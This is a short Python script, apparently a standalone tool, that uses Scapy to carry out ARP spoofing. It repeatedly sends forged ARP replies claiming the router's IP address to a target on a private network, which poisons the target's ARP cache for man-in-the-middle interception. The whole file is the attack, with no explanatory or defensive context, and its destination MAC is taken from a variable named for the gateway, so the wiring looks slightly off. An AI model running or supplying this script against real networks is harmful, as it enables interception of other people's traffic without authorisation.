from scapy.all import *
import time

def arp_spoof(router_ip, target_ip, gateway_mac):
    arp_reply = ARP(
        op=2,
        pdst=target_ip,
        hwdst=gateway_mac,
        psrc=router_ip
    )
    try:
        while True:
            send(arp_reply, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[+] ARP Spoofing Stopped")

if __name__ == "__main__":
    router_ip = "192.168.0.1"
    target_ip = "192.168.0.8"
    gateway_mac = "aa:bb:cc:dd:ee:ff"
    arp_spoof(router_ip, target_ip, gateway_mac)